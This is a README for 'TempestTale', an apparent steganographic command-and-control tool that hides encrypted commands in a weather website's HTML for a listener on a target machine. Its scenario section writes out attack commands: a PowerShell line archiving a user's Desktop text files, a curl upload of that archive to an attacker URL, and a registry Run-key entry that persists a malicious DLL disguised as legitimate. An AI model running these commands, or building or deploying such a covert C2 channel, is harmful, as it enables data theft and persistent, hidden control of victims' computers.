# TempestTale
Tempest refers to a violent storm, hinting at messages being hidden within storm data.

## Description
TempestTale is a Steganography tool that hides encrypted messages within the HTML of a [weather forecast website](https://www.tiempo3.com/). The capacity is very limited, so its main use is sending commands to a target machine.

## Requirements
To install all necessary dependencies, run the following command:
```bash
$ pip install -r requirements.txt
```

## Usage
1. Run the C2 Server:
```bash
$ python3 webserver.py
```
2. Create the message
```bash
$ python3 messageManager.py

1. Select the city where the message will be hidden
2. Enter the message
3.1. Select if you want to encrypt the message using a random key or a custom
3.2. In case you selected the manual key, enter it
4. Select if you want to send the key as a hidden cookie 
```
3. Receive the message
```bash
$ python3 listener.py

1. Select the city where the message is hidden (same city as before)
2. Enter the encryption key to decrypt the hidden message
```


## Scenarios
1. Test - Obtaining all .txt files from the Desktop
```bash
powershell -c "Compress-Archive C:\\Users\\%USERNAME%\\Desktop\\*.txt C:\\Temp\\data.zip
```

2. Test - Uploading those .txt files to an Attackers' URL
```bash
curl -F 'file=@C:\\Temp\\data.zip' http://m.com/upload"
```

3. Test - Creating Persistence by Adding a Malicious DLL Disguised as Legitimate to the Windows Registry Key to Execute at System Startup
```bash
powershell -c "reg add HKCU\\Run /v a /t REG_SZ /d 'rundll32 c:\\mscoree.dll,a' /f"
```
4. Test - Random String that Could be Information to Update the Malware or a New Plugin
```
e3fbc1a0d292e4a93b1f4c7d2c60f90b3a7d925c312e8b4e8abf2d0f61778
```